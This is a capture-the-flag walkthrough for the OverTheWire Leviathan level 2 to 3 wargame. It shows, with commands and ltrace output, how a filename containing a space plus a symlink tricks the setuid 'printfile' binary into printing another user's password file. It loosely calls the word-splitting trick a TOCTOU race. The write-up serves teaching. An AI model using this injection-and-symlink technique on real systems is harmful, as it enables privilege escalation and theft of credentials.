> **Level Goal:** There is no information for this level, intentionally. Figure it out yourself.

---

## Connection Details

| Field    | Value                                                   |
| -------- | ------------------------------------------------------- |
| Host     | `leviathan.labs.overthewire.org`                        |
| Port     | `2223`                                                  |
| Username | `leviathan2`                                            |
| Password | *[Leviathan Level 1 → 2](leviathan-level-1-level-2.md)* |

---

## Commands Used

- `ls -la` — List all files including hidden, with permissions and ownership
- `ltrace` — Trace library calls made by a running program
- `mkdir` — Create a directory
- `ln -s` — Create a symbolic link
- `touch` — Create an empty file

> **Reference:** [ltrace man page](https://man7.org/linux/man-pages/man1/ltrace.1.html) · [ln man page](https://man7.org/linux/man-pages/man1/ln.1.html) · [access(2) man page](https://man7.org/linux/man-pages/man2/access.2.html)

---

## Solution

### Step 1 — Connect to the Server

```bash
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

---

### Step 2 — Survey the Home Directory

```bash
leviathan2@leviathan:~$ ls -la
```

Output:

```
-r-sr-x--- 1 leviathan3 leviathan2 7436 Jan  1 00:00 printfile
```

A single setuid binary called `printfile`. Same pattern as the previous level, owned by the next user, executable by us.

---

### Step 3 — Understand What `printfile` Does

Run it without arguments:

```bash
leviathan2@leviathan:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```

It takes a filename as an argument. Try pointing it at the password file directly:

```bash
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

It refuses. Try it on a file we do own to confirm normal operation works:

```bash
leviathan2@leviathan:~$ ./printfile .bashrc
# output of .bashrc ...
```

That succeeds. The binary is printing files we're permitted to read, and rejecting ones we aren't.

---

### Step 4 — Trace the Binary with `ltrace`

```bash
leviathan2@leviathan:~$ ltrace ./printfile .bashrc
```

Relevant output:

```
__libc_start_main(0x80490ed, 2, 0xffffd464, 0 <unfinished ...>
access(".bashrc", 4)                             = 0
snprintf("/bin/cat .bashrc", 511, "/bin/cat %s", ".bashrc") = 16
geteuid()                                        = 12002
geteuid()                                        = 12002
setreuid(12002, 12002)                           = 0
system("/bin/cat .bashrc"export GAMEHOSTNAME=${GAMEHOSTNAME:-$HOSTNAME}
```

Two things stand out:

|Call|What it does|
|---|---|
|`access(filename, 4)`|Checks whether the **calling user** (`leviathan2`) can read the file — before the privilege change|
|`snprintf("/bin/cat %s", filename)`|Builds the shell command by inserting the filename directly into the string|
|`setreuid(...)` then `system(...)`|Elevates to `leviathan3` privileges, then runs `cat` via the shell|

The vulnerability is in the sequence: `access` uses the **real user ID** (`leviathan2`), but `system` runs `cat` under the **effective user ID** `leviathan3`, after `setreuid` promotes it. If we can pass a filename that clears the `access` check as `leviathan2` but causes `cat` to read a different file once the shell expands it, we win.

---

### Understand the TOCTOU and Shell Splitting Vulnerability

> `access` and `system` are called at different points in time with different privilege contexts. The gap between them is exploitable in two distinct ways. First, there is a **time-of-check to time-of-use (TOCTOU)** window, but the simpler attack here exploits a different property: `system` passes the filename to `/bin/sh -c`, which treats a **space as a word boundary**. `access` receives the full string (including the space), but `cat` inside the shell receives it as two separate arguments.

The `snprintf` call constructs:

```
/bin/cat <your filename>
```

This is handed to `system`, which calls `/bin/sh -c "/bin/cat <your filename>"`. The shell splits on spaces. If the filename contains a space, `cat` sees the part before the space as file 1 and the part after as file 2, **each processed independently under `leviathan3` privileges**.

---

### Step 5 — Set Up a Working Directory

```bash
leviathan2@leviathan:~$ mkdir /tmp/exploit
```

---

### Step 6 — Create a File With a Space in Its Name

```bash
leviathan2@leviathan:~$ touch "/tmp/exploit/leviathan3 pass"
```

Now `access` will check the full path `/tmp/exploit/leviathan3 pass`, which we own — so it returns 0 (allowed). But `system` passes it to the shell, which splits it into:

- `/tmp/exploit/leviathan3` → a path we control
- `pass` → a relative path

---

### Step 7 — Create a Symlink at the First Component

The shell will try to `cat /tmp/exploit/leviathan3` (elevated as `leviathan3`). Create a symbolic link at that path pointing to the password file:

```bash
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/exploit/leviathan3
```

`ln -s <target> <link>` creates a symlink named `/tmp/exploit/leviathan3` that points to the actual password file. When `cat` opens `/tmp/exploit/leviathan3` under `leviathan3` privileges, it transparently follows the link and reads the real file.

---

### Step 8 — Execute the Attack

```bash
leviathan2@leviathan:~$ ./printfile "/tmp/exploit/leviathan3 pass"
```

What happens:

1. `access("/tmp/exploit/leviathan3 pass", 4)` → checks our *leviathan2* permissions on the file we created. Returns 0 (permitted).
2. `snprintf` builds `/bin/cat /tmp/exploit/leviathan3 pass`
3. `setreuid` elevates to `leviathan3`
4. `system` runs `/bin/sh -c "/bin/cat /tmp/exploit/leviathan3 pass"` → shell splits on the space; `cat` reads `/tmp/exploit/leviathan3` (the symlink → password file) with `leviathan3` privileges.

Output:

```
<password>
/bin/cat: pass: No such file or directory
```

The password is printed (from the symlink), followed by a harmless error on the second argument. The error is expected and irrelevant.

That output is the password for [Leviathan Level 3 → 4](leviathan-level-3-level-4.md).

---

## Key Takeaways

- **TOCTOU is a class of vulnerability, not a single trick.** The `access` / `system` gap here is a textbook *time-of-check to time-of-use race*. The permission check and the privileged action happen at different times, anything that changes between them is exploitable. This pattern appears in real-world setuid programs and sudo misconfigurations, not just wargames.
- **`system` is dangerous because it invokes a shell.** Calling `system("/bin/cat " + filename)` lets the shell interpret the filename. A filename containing spaces, semicolons, backticks, or `$(...)` can all cause the shell to do something the programmer didn't intend.
- **Symbolic links let you point a path you control at a file you can't directly name.** The `access` check sees our file; `cat` follows the symlink to the real target. Symlinks are a standard tool for privilege escalation wherever a setuid program operates on an attacker-controlled path.
- **`ltrace` is the first tool to reach for when a binary's logic isn't obvious.** It revealed the exact library call sequence, `access` then `setreuid` then `system`, which made the vulnerability immediately legible. Without `ltrace`, the gap between the two privilege contexts would be invisible from the outside.

---